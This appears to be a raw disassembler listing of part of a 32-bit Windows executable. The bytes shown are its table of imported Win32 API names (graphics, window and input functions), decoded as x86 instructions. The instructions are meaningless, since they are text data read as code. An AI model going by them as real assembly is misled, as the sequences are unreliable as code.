  41df34:	fs add BYTE PTR gs:[eax],al
  41df38:	lahf   
  41df39:	add    BYTE PTR [ebx+0x72],al
  41df3c:	gs popa 
  41df3e:	je     0x41dfa5
  41df40:	dec    eax
  41df41:	popa   
  41df42:	ins    BYTE PTR es:[edi],dx
  41df43:	data16 je 0x41dfb5
  41df46:	outs   dx,BYTE PTR ds:[esi]
  41df47:	gs push eax
  41df49:	popa   
  41df4a:	ins    BYTE PTR es:[edi],dx
  41df4b:	gs je  0x41dfc2
  41df4e:	gs add dh,ch
  41df51:	add    DWORD PTR [ebx+0x65],edx
  41df54:	je     0x41dfa6
  41df56:	popa   
  41df57:	ins    BYTE PTR es:[edi],dx
  41df58:	gs je  0x41dfcf
  41df5b:	gs inc ebp
  41df5d:	outs   dx,BYTE PTR ds:[esi]
  41df5e:	je     0x41dfd2
  41df60:	imul   esp,DWORD PTR [ebp+0x73],0x43009400
  41df67:	jb     0x41dfce
  41df69:	popa   
  41df6a:	je     0x41dfd1
  41df6c:	inc    esp
  41df6d:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41df74:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  41df78:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd50070
  41df80:	inc    ebp
  41df81:	js     0x41dff7
  41df83:	push   esp
  41df84:	gs js  0x41dffb
  41df87:	dec    edi
  41df88:	jne    0x41dffe
  41df8a:	push   edi
  41df8b:	add    BYTE PTR [edx+eax*1],cl
  41df8e:	push   esp
  41df8f:	gs js  0x41e006
  41df92:	dec    edi
  41df93:	jne    0x41e009
  41df95:	push   edi
  41df96:	add    BYTE PTR [eax],al
  41df98:	dec    ebx
  41df99:	add    DWORD PTR [edi+0x65],eax
  41df9c:	je     0x41dfe4
  41df9e:	outs   dx,DWORD PTR ds:[esi]
  41df9f:	outs   dx,BYTE PTR ds:[esi]
  41dfa0:	je     0x41dfe6
  41dfa2:	popa   
  41dfa3:	je     0x41e006
  41dfa5:	add    BYTE PTR [edi],bh
  41dfa7:	add    DWORD PTR [edi+0x65],eax
  41dfaa:	je     0x41dff0
  41dfac:	dec    ecx
  41dfad:	inc    edx
  41dfae:	inc    ebx
  41dfaf:	outs   dx,DWORD PTR ds:[esi]
  41dfb0:	ins    BYTE PTR es:[edi],dx
  41dfb1:	outs   dx,DWORD PTR ds:[esi]
  41dfb2:	jb     0x41e008
  41dfb4:	popa   
  41dfb5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41dfb9:	add    BYTE PTR [ecx+eax*1+0x796c6f50],dh
  41dfc0:	ins    BYTE PTR es:[edi],dx
  41dfc1:	imul   ebp,DWORD PTR [esi+0x65],0x1890000
  41dfc8:	inc    edi
  41dfc9:	gs je  0x41e020
  41dfcc:	gs js  0x41e043
  41dfcf:	inc    esi
  41dfd0:	popa   
  41dfd1:	arpl   WORD PTR [ebp+0x57],sp
  41dfd4:	add    BYTE PTR [eax],al
  41dfd6:	jnp    0x41dfd9
  41dfd8:	inc    edi
  41dfd9:	gs je  0x41e030
  41dfdc:	gs js  0x41e053
  41dfdf:	inc    ecx
  41dfe0:	ins    BYTE PTR es:[edi],dx
  41dfe1:	imul   esp,DWORD PTR [edi+0x6e],0x890000
  41dfe8:	inc    ebx
  41dfe9:	jb     0x41e050
  41dfeb:	popa   
  41dfec:	je     0x41e053
  41dfee:	inc    edx
  41dfef:	jb     0x41e066
  41dff1:	jae    0x41e05b
  41dff3:	dec    ecx
  41dff4:	outs   dx,BYTE PTR ds:[esi]
  41dff5:	imul   esi,DWORD PTR fs:[edx+0x65],0x24007463
  41dffd:	add    DWORD PTR [edi+0x65],eax
  41e000:	je     0x41e044
  41e002:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  41e006:	add    BYTE PTR gs:[ecx+eax*1+0x47],bl
  41e00b:	gs je  0x41e05a
  41e00e:	popa   
  41e00f:	jns    0x41e080
  41e011:	jne    0x41e087
  41e013:	add    BYTE PTR [eax+0x65724300],dh
  41e019:	popa   
  41e01a:	je     0x41e081
  41e01c:	push   ebx
  41e01d:	outs   dx,DWORD PTR ds:[esi]
  41e01e:	ins    BYTE PTR es:[edi],dx
  41e01f:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  41e027:	add    ah,al
  41e029:	add    BYTE PTR [ebp+0x6e],al
  41e02c:	jne    0x41e09b
  41e02e:	inc    esi
  41e02f:	outs   dx,DWORD PTR ds:[esi]
  41e030:	outs   dx,BYTE PTR ds:[esi]
  41e031:	je     0x41e079
  41e033:	popa   
  41e034:	ins    DWORD PTR es:[edi],dx
  41e035:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41e03d:	add    BYTE PTR [eax+0x65724300],cl
  41e043:	popa   
  41e044:	je     0x41e0ab
  41e046:	inc    edx
  41e047:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  41e04f:	imul   esi,DWORD PTR [edx+0x65],0x7463
  41e056:	xchg   DWORD PTR [eax],eax
  41e058:	inc    ebx
  41e059:	jb     0x41e0c0
  41e05b:	popa   
  41e05c:	je     0x41e0c3
  41e05e:	inc    edx
  41e05f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa7000070
  41e067:	add    BYTE PTR [ebx+0x72],al
  41e06a:	gs popa 
  41e06c:	je     0x41e0d3
  41e06e:	push   eax
  41e06f:	outs   dx,BYTE PTR gs:[esi]
  41e071:	add    BYTE PTR [edx+0x65724300],dl
  41e077:	popa   
  41e078:	je     0x41e0df
  41e07a:	inc    esp
  41e07b:	dec    ecx
  41e07c:	inc    edx
  41e07d:	push   ebx
  41e07e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41e083:	outs   dx,BYTE PTR ds:[esi]
  41e084:	add    BYTE PTR [eax],al
  41e086:	add    DWORD PTR [eax],0x626d6f43
  41e08c:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  41e093:	add    BYTE PTR [esi+0x1],ah
  41e096:	inc    edi
  41e097:	gs je  0x41e0e8
  41e09a:	gs popa 
  41e09c:	jb     0x41e103
  41e09e:	jae    0x41e114
  41e0a0:	push   eax
  41e0a1:	popa   
  41e0a2:	ins    BYTE PTR es:[edi],dx
  41e0a3:	gs je  0x41e11a
  41e0a6:	gs dec ecx
  41e0a8:	outs   dx,BYTE PTR ds:[esi]
  41e0a9:	fs gs js 0x41e0ad
  41e0ad:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  41e0b4:	jo     0x41e129
  41e0b6:	add    BYTE PTR gs:[edx+0x74654701],cl
  41e0bd:	push   esp
  41e0be:	gs js  0x41e135
  41e0c1:	dec    ebp
  41e0c2:	gs je  0x41e137
  41e0c5:	imul   esp,DWORD PTR [ebx+0x73],0x1b80041
  41e0cc:	push   edx
  41e0cd:	gs popa 
  41e0cf:	ins    BYTE PTR es:[edi],dx
  41e0d0:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  41e0d7:	je     0x41e14d
  41e0d9:	add    BYTE PTR gs:[eax],al
  41e0dc:	lar    edx,WORD PTR [ebp+0x6e]
  41e0e0:	jb     0x41e147
  41e0e2:	popa   
  41e0e3:	ins    BYTE PTR es:[edi],dx
  41e0e4:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  41e0eb:	arpl   WORD PTR [eax+eax*1-0x6],si
  41e0ef:	add    DWORD PTR [ebx+0x65],edx
  41e0f2:	je     0x41e148
  41e0f4:	gs js  0x41e16b
  41e0f7:	inc    ebx
  41e0f8:	outs   dx,DWORD PTR ds:[esi]
  41e0f9:	ins    BYTE PTR es:[edi],dx
  41e0fa:	outs   dx,DWORD PTR ds:[esi]
  41e0fb:	jb     0x41e0fd
  41e0fd:	add    BYTE PTR [esi+0x646e4500],bh
  41e103:	inc    esp
  41e104:	outs   dx,DWORD PTR ds:[esi]
  41e105:	arpl   WORD PTR [eax],ax
  41e107:	add    BYTE PTR [edx+0x1],bh
  41e10a:	inc    edi
  41e10b:	gs je  0x41e161
  41e10e:	jns    0x41e183
  41e110:	je     0x41e177
  41e112:	ins    DWORD PTR es:[edi],dx
  41e113:	push   eax
  41e114:	popa   
  41e115:	ins    BYTE PTR es:[edi],dx
  41e116:	gs je  0x41e18d
  41e119:	gs push ebp
  41e11b:	jae    0x41e182
  41e11d:	add    dh,bl
  41e11f:	add    DWORD PTR [ebx+0x65],edx
  41e122:	je     0x41e168
  41e124:	dec    ecx
  41e125:	inc    edx
  41e126:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  41e12e:	imul   esp,DWORD PTR [ebx+0x65],0x5301dc00
  41e135:	gs je  0x41e17c
  41e138:	dec    ecx
  41e139:	inc    edx
  41e13a:	inc    ebx
  41e13b:	outs   dx,DWORD PTR ds:[esi]
  41e13c:	ins    BYTE PTR es:[edi],dx
  41e13d:	outs   dx,DWORD PTR ds:[esi]
  41e13e:	jb     0x41e194
  41e140:	popa   
  41e141:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e145:	add    al,dl
  41e147:	add    DWORD PTR [ebx+0x65],edx
  41e14a:	je     0x41e18d
  41e14c:	bound  ebp,QWORD PTR [edi+0x72]
  41e14f:	je     0x41e1a1
  41e151:	jb     0x41e1c2
  41e153:	arpl   WORD PTR [eax],ax
  41e155:	add    ah,al
  41e157:	add    DWORD PTR [edx+0x65],edx
  41e15a:	jae    0x41e1c5
  41e15c:	jp     0x41e1c3
  41e15e:	push   eax
  41e15f:	popa   
  41e160:	ins    BYTE PTR es:[edi],dx
  41e161:	gs je  0x41e1d8
  41e164:	add    BYTE PTR gs:[edx+eax*1],dl
  41e168:	push   edi
  41e169:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41e171:	add    dh,cl
  41e173:	add    BYTE PTR [ebp+0x78],al
  41e176:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  41e17a:	gs inc ebx
  41e17c:	ins    BYTE PTR es:[edi],dx
  41e17d:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41e184:	xchg   esi,eax
  41e185:	add    BYTE PTR [ebx+0x72],al
  41e188:	gs popa 
  41e18a:	je     0x41e1f1
  41e18c:	inc    ebp
  41e18d:	ins    BYTE PTR es:[edi],dx
  41e18e:	ins    BYTE PTR es:[edi],dx
  41e18f:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  41e196:	outs   dx,BYTE PTR ds:[esi]
  41e197:	dec    ecx
  41e198:	outs   dx,BYTE PTR ds:[esi]
  41e199:	imul   esi,DWORD PTR fs:[edx+0x65],0xc1007463
  41e1a1:	add    DWORD PTR [edx+0x65],edx
  41e1a4:	ins    DWORD PTR es:[edi],dx
  41e1a5:	outs   dx,DWORD PTR ds:[esi]
  41e1a6:	jbe    0x41e20d
  41e1a8:	inc    esi
  41e1a9:	outs   dx,DWORD PTR ds:[esi]
  41e1aa:	outs   dx,BYTE PTR ds:[esi]
  41e1ab:	je     0x41e1ff
  41e1ad:	gs jae 0x41e21f
  41e1b0:	jne    0x41e224
  41e1b2:	arpl   WORD PTR [ebp+0x57],sp
  41e1b5:	add    BYTE PTR [edi+0x65724300],cl
  41e1bb:	popa   
  41e1bc:	je     0x41e223
  41e1be:	inc    esp
  41e1bf:	inc    ebx
  41e1c0:	push   edi
  41e1c1:	add    BYTE PTR [edx+0x65724300],ch
  41e1c7:	popa   
  41e1c8:	je     0x41e22f
  41e1ca:	push   eax
  41e1cb:	outs   dx,DWORD PTR ds:[esi]
  41e1cc:	ins    BYTE PTR es:[edi],dx
  41e1cd:	jns    0x41e236
  41e1cf:	outs   dx,DWORD PTR ds:[esi]
  41e1d0:	outs   dx,BYTE PTR ds:[esi]
  41e1d1:	push   edx
  41e1d2:	outs   dx,BYTE PTR ds:[si]
  41e1d4:	add    BYTE PTR [eax],al
  41e1d6:	mov    es,WORD PTR [ecx]
  41e1d8:	inc    edi
  41e1d9:	gs je  0x41e232
  41e1dc:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41e1e3:	dec    edi
  41e1e4:	jb     0x41e24d
  41e1e6:	inc    ebp
  41e1e7:	js     0x41e1e9
  41e1e9:	add    BYTE PTR [edi+0x44],al
  41e1ec:	dec    ecx
  41e1ed:	xor    esi,DWORD PTR [edx]
  41e1ef:	cs fs ins BYTE PTR es:[edi],dx
  41e1f2:	ins    BYTE PTR es:[edi],dx
  41e1f3:	add    BYTE PTR [eax+eax*1+0x74736544],dl
  41e1fa:	jb     0x41e26b
  41e1fc:	jns    0x41e241
  41e1fe:	popa   
  41e1ff:	jb     0x41e266
  41e201:	je     0x41e203
  41e203:	add    BYTE PTR [eax+0x61724400],dh
  41e209:	ja     0x41e251
  41e20b:	outs   dx,DWORD PTR ds:[esi]
  41e20c:	arpl   WORD PTR [ebp+0x73],si
  41e20f:	push   edx
  41e210:	arpl   WORD PTR gs:[eax+eax*1-0x4e],si
  41e215:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e219:	fs dec ecx
  41e21b:	ins    DWORD PTR es:[edi],dx
  41e21c:	popa   
  41e21d:	addr16 gs push edi
  41e220:	add    BYTE PTR [eax],al
  41e222:	mov    eax,0x69615702
  41e227:	je     0x41e276
  41e229:	gs jae 0x41e29f
  41e22c:	popa   
  41e22d:	add    BYTE PTR gs:[bx+0x4400],dl
  41e233:	gs jae 0x41e2aa
  41e236:	jb     0x41e2a7
  41e238:	jns    0x41e287
  41e23a:	outs   dx,BYTE PTR gs:[esi]
  41e23c:	jne    0x41e23e
  41e23e:	stos   DWORD PTR es:[edi],eax
  41e23f:	add    BYTE PTR [edx+esi*2+0x61],al
  41e243:	ja     0x41e286
  41e245:	outs   dx,BYTE PTR ds:[esi]
  41e246:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  41e24d:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  41e252:	mov    BYTE PTR [eax],al
  41e254:	inc    esp
  41e255:	gs inc sp
  41e258:	ins    BYTE PTR es:[edi],dx
  41e259:	addr16 push eax
  41e25b:	jb     0x41e2cc
  41e25d:	arpl   WORD PTR [edi+0x0],dx
  41e260:	add    DWORD PTR [eax],eax
  41e262:	inc    ecx
  41e263:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41e267:	popa   
  41e268:	je     0x41e2cf
  41e26a:	dec    ebx
  41e26b:	gs jns 0x41e2d0
  41e26e:	outs   dx,DWORD PTR ds:[esi]
  41e26f:	popa   
  41e270:	jb     0x41e2d6
  41e272:	dec    esp
  41e273:	popa   
  41e274:	jns    0x41e2e5
  41e276:	jne    0x41e2ec
  41e278:	add    BYTE PTR [eax],al
  41e27a:	data16 add dl,BYTE PTR [ebx+0x65]
  41e27e:	je     0x41e2d4
  41e280:	imul   ebp,DWORD PTR [ebp+0x65],0x75000072
  41e287:	add    DWORD PTR [edi+0x65],eax
  41e28a:	je     0x41e2e3
  41e28c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e293:	js     0x41e309
  41e295:	inc    ecx
  41e296:	add    BYTE PTR [eax],al
  41e298:	and    eax,0x6e655302
  41e29d:	fs dec ecx
  41e29f:	outs   dx,BYTE PTR ds:[esi]
  41e2a0:	jo     0x41e317
  41e2a2:	je     0x41e2a4
  41e2a4:	mov    edi,0x636f4c01
  41e2a9:	imul   edx,DWORD PTR [edi+0x69],0x6e
  41e2ad:	outs   dx,DWORD PTR fs:[esi]
  41e2af:	ja     0x41e306
  41e2b1:	jo     0x41e317
  41e2b3:	popa   
  41e2b4:	je     0x41e31b
  41e2b6:	add    BYTE PTR [eax],al
  41e2b8:	mov    bh,0x2
  41e2ba:	push   edi
  41e2bb:	popa   
  41e2bc:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  41e2c4:	jne    0x41e33a
  41e2c6:	dec    ecx
  41e2c7:	fs ins BYTE PTR es:[edi],dx
  41e2c9:	add    BYTE PTR gs:[eax],al
  41e2cc:	dec    eax
  41e2cd:	add    dl,BYTE PTR [ebx+0x65]
  41e2d0:	je     0x41e31f
  41e2d2:	outs   dx,BYTE PTR gs:[esi]
  41e2d4:	jne    0x41e2d6
  41e2d6:	sub    eax,DWORD PTR [ecx]
  41e2d8:	inc    edi
  41e2d9:	gs je  0x41e329
  41e2dc:	outs   dx,BYTE PTR gs:[esi]
  41e2de:	jne    0x41e2e0
  41e2e0:	adc    eax,DWORD PTR [edx]
  41e2e2:	push   edx
  41e2e3:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  41e2ec:	outs   dx,BYTE PTR ds:[esi]
  41e2ed:	outs   dx,DWORD PTR fs:[esi]
  41e2ef:	ja     0x41e33e
  41e2f1:	gs jae 0x41e367
  41e2f4:	popa   
  41e2f5:	addr16 gs push edi
  41e2f8:	add    BYTE PTR [eax],al
  41e2fa:	push   ebp
  41e2fb:	add    DWORD PTR [edi+0x65],eax
  41e2fe:	je     0x41e353
  41e300:	arpl   WORD PTR [edx+0x6f],si
  41e303:	ins    BYTE PTR es:[edi],dx
  41e304:	ins    BYTE PTR es:[edi],dx
  41e305:	push   eax
  41e306:	outs   dx,DWORD PTR ds:[esi]
  41e307:	jae    0x41e309
  41e309:	add    bh,cl
  41e30b:	add    DWORD PTR [ebp+0x65],ecx
  41e30e:	jae    0x41e383
  41e310:	popa   
  41e311:	addr16 gs inc edx
  41e314:	outs   dx,DWORD PTR ds:[esi]
  41e315:	js     0x41e35c
  41e317:	js     0x41e35a
  41e319:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  41e320:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x65470164
  41e328:	je     0x41e37f
  41e32a:	jo     0x41e390
  41e32c:	popa   
  41e32d:	je     0x41e394
  41e32f:	push   edx
  41e330:	outs   dx,BYTE PTR ds:[si]
  41e332:	add    BYTE PTR [eax],al
  41e334:	mov    dh,0x1
  41e336:	dec    esp
  41e337:	outs   dx,DWORD PTR ds:[esi]
  41e338:	popa   
  41e339:	fs dec ebp
  41e33b:	outs   dx,BYTE PTR gs:[esi]
  41e33d:	jne    0x41e380
  41e33f:	add    BYTE PTR [ecx],cl
  41e341:	add    BYTE PTR [ecx+0x70],al
  41e344:	jo     0x41e3ab
  41e346:	outs   dx,BYTE PTR ds:[esi]
  41e347:	fs dec ebp
  41e349:	outs   dx,BYTE PTR gs:[esi]
  41e34b:	jne    0x41e3a4
  41e34d:	add    BYTE PTR [ebp+0x0],bl
  41e350:	inc    ebx
  41e351:	jb     0x41e3b8
  41e353:	popa   
  41e354:	je     0x41e3bb
  41e356:	dec    ecx
  41e357:	arpl   WORD PTR [edi+0x6e],bp
  41e35a:	dec    ecx
  41e35b:	outs   dx,BYTE PTR ds:[esi]
  41e35c:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  41e364:	ins    BYTE PTR es:[edi],dx
  41e365:	add    DWORD PTR [edi+0x65],eax
  41e368:	je     0x41e3c1
  41e36a:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e371:	outs   dx,BYTE PTR ds:[esi]
  41e372:	addr16 inc ecx
  41e374:	add    BYTE PTR [eax],al
  41e376:	ja     0x41e379
  41e378:	inc    edi
  41e379:	gs je  0x41e3d3
  41e37c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e383:	js     0x41e3f9
  41e385:	dec    esp
  41e386:	outs   dx,BYTE PTR gs:[esi]
  41e388:	addr16 je 0x41e3f3
  41e38b:	push   edi
  41e38c:	add    BYTE PTR [eax],al
  41e38e:	cmp    eax,0x65684300
  41e393:	arpl   WORD PTR [ebx+0x52],bp
  41e396:	popa   
  41e397:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  41e39f:	outs   dx,BYTE PTR ds:[esi]
  41e3a0:	add    BYTE PTR [eax],al
  41e3a2:	add    BYTE PTR [ecx],0x49
  41e3a5:	outs   dx,BYTE PTR ds:[esi]
  41e3a6:	data16 ins BYTE PTR es:[edi],dx
  41e3a8:	popa   
  41e3a9:	je     0x41e410
  41e3ab:	push   edx
  41e3ac:	arpl   WORD PTR gs:[eax+eax*1-0x70],si
  41e3b1:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41e3b5:	arpl   WORD PTR [ebx+0x50],bp
  41e3b8:	outs   dx,DWORD PTR ds:[esi]
  41e3b9:	jo     0x41e430
  41e3bb:	jo     0x41e40a
  41e3bd:	outs   dx,BYTE PTR gs:[esi]
  41e3bf:	jne    0x41e3c1
  41e3c1:	add    BYTE PTR ds:0x6c655202,dl
  41e3c7:	gs popa 
  41e3c9:	jae    0x41e430
  41e3cb:	inc    esp
  41e3cc:	inc    ebx
  41e3cd:	add    BYTE PTR [ebx],ch
  41e3cf:	add    dl,BYTE PTR [ebx+0x65]
  41e3d2:	outs   dx,BYTE PTR ds:[esi]
  41e3d3:	fs dec ebp
  41e3d5:	gs jae 0x41e44b
  41e3d8:	popa   
  41e3d9:	addr16 gs push edi
  41e3dc:	add    BYTE PTR [eax],al
  41e3de:	fild   DWORD PTR [ecx]
  41e3e0:	dec    ebp
  41e3e1:	outs   dx,DWORD PTR ds:[esi]
  41e3e2:	jbe    0x41e449
  41e3e4:	push   edi
  41e3e5:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e3ec:	mov    dl,0x0
  41e3ee:	inc    esp
  41e3ef:	jb     0x41e452
  41e3f1:	ja     0x41e439
  41e3f3:	jb     0x41e456
  41e3f5:	ins    DWORD PTR es:[edi],dx
  41e3f6:	gs inc ebx
  41e3f8:	outs   dx,DWORD PTR ds:[esi]
  41e3f9:	outs   dx,BYTE PTR ds:[esi]
  41e3fa:	je     0x41e46e
  41e3fc:	outs   dx,DWORD PTR ds:[esi]
  41e3fd:	ins    BYTE PTR es:[edi],dx
  41e3fe:	add    BYTE PTR [eax],al
  41e400:	stos   DWORD PTR es:[edi],eax
  41e401:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e405:	fs inc ebx
  41e407:	jne    0x41e47b
  41e409:	jae    0x41e47a
  41e40b:	jb     0x41e44e
  41e40d:	add    BYTE PTR [eax+0x2],ch
  41e410:	push   ebx
  41e411:	gs je  0x41e469
  41e414:	jae    0x41e47b
  41e416:	jb     0x41e467
  41e418:	bound  ebp,QWORD PTR [edx+0x65]
  41e41b:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41e41f:	outs   dx,WORD PTR ds:[esi]
  41e421:	jb     0x41e490
  41e423:	popa   
  41e424:	je     0x41e48f
  41e426:	outs   dx,DWORD PTR ds:[esi]
  41e427:	outs   dx,BYTE PTR ds:[esi]
  41e428:	push   edi
  41e429:	add    BYTE PTR [ecx+0x0],ah
  41e42c:	inc    ebx
  41e42d:	jb     0x41e494
  41e42f:	popa   
  41e430:	je     0x41e497
  41e432:	push   eax
  41e433:	outs   dx,DWORD PTR ds:[esi]
  41e434:	jo     0x41e4ab
  41e436:	jo     0x41e485
  41e438:	outs   dx,BYTE PTR gs:[esi]
  41e43a:	jne    0x41e43c
  41e43c:	xor    al,0x2
  41e43e:	push   ebx
  41e43f:	gs je  0x41e485
  41e442:	ins    BYTE PTR es:[edi],dx
  41e443:	popa   
  41e444:	jae    0x41e4b9
  41e446:	dec    esp
  41e447:	outs   dx,DWORD PTR ds:[esi]
  41e448:	outs   dx,BYTE PTR ds:[esi]
  41e449:	addr16 push edi
  41e44b:	add    BYTE PTR [ebx+0x0],ah
  41e44e:	inc    ebx
  41e44f:	jb     0x41e4b6
  41e451:	popa   
  41e452:	je     0x41e4b9
  41e454:	push   edi
  41e455:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e45c:	push   edi
  41e45d:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  41e464:	outs   dx,DWORD PTR ds:[esi]
  41e465:	outs   dx,BYTE PTR ds:[esi]
  41e466:	imul   esp,DWORD PTR [ebx+0x0],0x49018500
  41e46d:	outs   dx,BYTE PTR ds:[esi]
  41e46e:	jae    0x41e4d5
  41e470:	jb     0x41e4e6
  41e472:	dec    ebp
  41e473:	outs   dx,BYTE PTR gs:[esi]
  41e475:	jne    0x41e4c0
  41e477:	je     0x41e4de
  41e479:	ins    DWORD PTR es:[edi],dx
  41e47a:	push   edi
  41e47b:	add    ah,ah
  41e47d:	add    DWORD PTR [edi+0x66],ecx
  41e480:	data16 jae 0x41e4e8
  41e483:	je     0x41e4d7
  41e485:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e48a:	scas   al,BYTE PTR es:[edi]
  41e48b:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e48f:	fs inc ebx
  41e491:	jne    0x41e505
  41e493:	jae    0x41e504
  41e495:	jb     0x41e4ee
  41e497:	add    BYTE PTR [ebx],al
  41e499:	add    BYTE PTR [ecx+0x64],al
  41e49c:	push   0x75
  41e49e:	jae    0x41e514
  41e4a0:	push   edi
  41e4a1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  41e4a8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41e4ac:	add    BYTE PTR [eax],al
  41e4ae:	js     0x41e4b1
  41e4b0:	inc    edi
  41e4b1:	gs je  0x41e50b
  41e4b4:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e4bb:	js     0x41e531
  41e4bd:	push   edi
  41e4be:	add    BYTE PTR [eax],al
  41e4c0:	push   cs
  41e4c1:	add    DWORD PTR [edi+0x65],eax
  41e4c4:	je     0x41e50a
  41e4c6:	ins    BYTE PTR es:[edi],dx
  41e4c7:	addr16 inc ebx
  41e4c9:	je     0x41e53d
  41e4cb:	ins    BYTE PTR es:[edi],dx
  41e4cc:	dec    ecx
  41e4cd:	inc    esp
  41e4ce:	add    BYTE PTR [eax],al
  41e4d0:	mov    esp,0x6e695702
  41e4d5:	outs   dx,DWORD PTR fs:[esi]
  41e4d7:	ja     0x41e51f
  41e4d9:	jb     0x41e54a
  41e4db:	ins    DWORD PTR es:[edi],dx
  41e4dc:	push   eax
  41e4dd:	outs   dx,DWORD PTR ds:[esi]
  41e4de:	imul   ebp,DWORD PTR [esi+0x74],0x49018300
  41e4e5:	outs   dx,BYTE PTR ds:[esi]
  41e4e6:	jae    0x41e54d
  41e4e8:	jb     0x41e55e
  41e4ea:	dec    ebp
  41e4eb:	outs   dx,BYTE PTR gs:[esi]
  41e4ed:	jne    0x41e530
  41e4ef:	add    BYTE PTR [esi+0x73795302],al
  41e4f5:	je     0x41e55c
  41e4f7:	ins    DWORD PTR es:[edi],dx
  41e4f8:	push   eax
  41e4f9:	popa   
  41e4fa:	jb     0x41e55d
  41e4fc:	ins    DWORD PTR es:[edi],dx
  41e4fd:	gs je  0x41e565
  41e500:	jb     0x41e575
  41e502:	dec    ecx
  41e503:	outs   dx,BYTE PTR ds:[esi]
  41e504:	outs   dx,WORD PTR ds:[esi]
  41e506:	push   edi
  41e507:	add    BYTE PTR [edx],dh
  41e509:	add    DWORD PTR [edi+0x65],eax
  41e50c:	je     0x41e55b
  41e50e:	outs   dx,BYTE PTR gs:[esi]
  41e510:	jne    0x41e55b
  41e512:	je     0x41e579
  41e514:	ins    DWORD PTR es:[edi],dx
  41e515:	inc    ebx
  41e516:	outs   dx,DWORD PTR ds:[esi]
  41e517:	jne    0x41e587
  41e519:	je     0x41e51b
  41e51b:	add    BYTE PTR [ecx+0x4b6b5602],dh
  41e521:	gs jns 0x41e577
  41e524:	arpl   WORD PTR [ecx+0x6e],sp
  41e527:	push   edi
  41e528:	add    BYTE PTR [eax],al
  41e52a:	add    eax,DWORD PTR [edx]
  41e52c:	push   edx
  41e52d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e536:	popa   
  41e537:	jae    0x41e5ac
  41e539:	inc    ebp
  41e53a:	js     0x41e57d
  41e53c:	add    BYTE PTR [eax],al
  41e53e:	ret    
  41e53f:	add    BYTE PTR [ebp+0x6e],al
  41e542:	fs inc esp
  41e544:	imul   esp,DWORD PTR [ecx+0x6c],0x4600676f
  41e54b:	add    BYTE PTR [ebx+0x6c],al
  41e54e:	outs   dx,DWORD PTR ds:[esi]
  41e54f:	jae    0x41e5b6
  41e551:	inc    esp
  41e552:	gs jae 0x41e5c0
  41e555:	je     0x41e5c6
  41e557:	jo     0x41e559
  41e559:	add    BYTE PTR [eax+0x44734901],bl
  41e55f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  41e566:	jae    0x41e5db
  41e568:	popa   
  41e569:	addr16 gs push edi
  41e56c:	add    BYTE PTR [eax],al
  41e56e:	out    0x1,eax
  41e570:	dec    edi
  41e571:	jo     0x41e5d8
  41e573:	outs   dx,BYTE PTR ds:[esi]
  41e574:	inc    esp
  41e575:	gs jae 0x41e5e3
  41e578:	je     0x41e5e9
  41e57a:	jo     0x41e5d3
  41e57c:	add    BYTE PTR [eax],al
  41e57e:	and    BYTE PTR [edx],al
  41e580:	push   ebx
  41e581:	arpl   WORD PTR [edx+0x6f],si
  41e584:	ins    BYTE PTR es:[edi],dx
  41e585:	ins    BYTE PTR es:[edi],dx
  41e586:	push   edi
  41e587:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e58e:	add    BYTE PTR [eax],al
  41e590:	mov    al,ds:0x57734901
  41e595:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e59c:	xor    eax,0x61684300
  41e5a1:	jb     0x41e5f7
  41e5a3:	outs   dx,DWORD PTR ds:[esi]
  41e5a4:	dec    edi
  41e5a5:	gs ins DWORD PTR es:[edi],dx
  41e5a7:	push   edi
  41e5a8:	add    BYTE PTR [eax],al
  41e5aa:	xor    al,BYTE PTR [edx]
  41e5ac:	push   ebx
  41e5ad:	gs je  0x41e5f3
  41e5b0:	popa   
  41e5b1:	jb     0x41e618
  41e5b3:	je     0x41e605
